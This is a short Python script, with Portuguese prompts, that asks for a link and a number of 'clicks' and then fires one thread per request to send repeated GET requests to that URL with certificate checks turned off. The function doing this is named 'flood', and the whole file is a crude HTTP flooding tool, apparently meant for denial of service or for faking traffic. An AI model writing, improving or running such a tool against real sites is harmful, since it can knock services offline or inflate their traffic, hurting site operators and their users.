from ast import While
import threading
import requests
import urllib3

def flood(url):
	urllib3.disable_warnings()
	return requests.get(url, verify=False)

carga = input("Quantidade de clicks: ")
link = input("Cole o link aqui: ")
contador = 0
while(contador <= int(carga)):
    t = threading.Thread(target=flood,args=(link,))
    print("Click "+str(contador))
    t.start()
    contador = contador + 1